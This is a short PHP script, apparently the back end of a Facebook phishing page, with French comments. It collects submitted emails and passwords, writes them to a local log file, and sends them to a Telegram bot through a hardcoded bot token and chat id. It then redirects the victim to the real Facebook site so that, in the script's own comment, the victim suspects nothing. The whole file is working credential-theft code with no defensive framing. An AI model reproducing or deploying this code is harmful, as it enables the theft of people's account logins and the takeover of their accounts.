<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $pass = $_POST['pass'] ?? '';

    // Nettoyage simple (optionnel)
    $email = trim(htmlspecialchars($email));
    $pass = trim(htmlspecialchars($pass));

    // 🔒 Enregistre localement dans un fichier log sécurisé
    $file = fopen("log.txt", "a");
    fwrite($file, date('Y-m-d H:i:s') . " | Email: $email | Mot de passe: $pass\n");
    fclose($file);

    // 📤 Envoie à ton bot Telegram
    $token = "7210538824:AAF-sURnyKq7Ft9nJBOxLDm7n933yboIVDE";
    $chat_id = "6299548804";

    $msg = "🧪 Facebook TEST\n👤 Email: $email\n🔑 Password: $pass";

    @file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($msg));

    // Redirige vers Facebook officiel (victime ne se doute de rien)
    header("Location: https://www.facebook.com/");
    exit();
} else {
    // Si accès direct en GET, redirige vers page de connexion
    header("Location: index.html");
    exit();
}
?>
